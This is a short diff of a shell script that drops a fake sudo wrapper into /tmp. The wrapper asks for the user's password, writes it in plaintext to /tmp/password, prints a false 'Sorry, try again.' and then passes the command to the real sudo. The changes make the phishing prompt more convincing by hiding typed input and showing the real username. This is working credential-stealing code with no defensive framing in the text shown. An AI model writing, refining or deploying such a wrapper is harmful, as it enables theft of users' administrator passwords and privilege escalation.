@@ -53,9 +53,9 @@ cat &lt;&lt;\EOF > /tmp/sudo
 if [[ "${@}" = "" ]]; then
   /usr/bin/sudo
 else
-  read -r -p "[sudo] password for user: " password
+  read -s -r -p "[sudo] password for ${USER}: " password
   echo "${password}" > /tmp/password
-  echo "Sorry, try again."
+  echo -e "\nSorry, try again."
   /usr/bin/sudo ${@}
 fi
 EOF
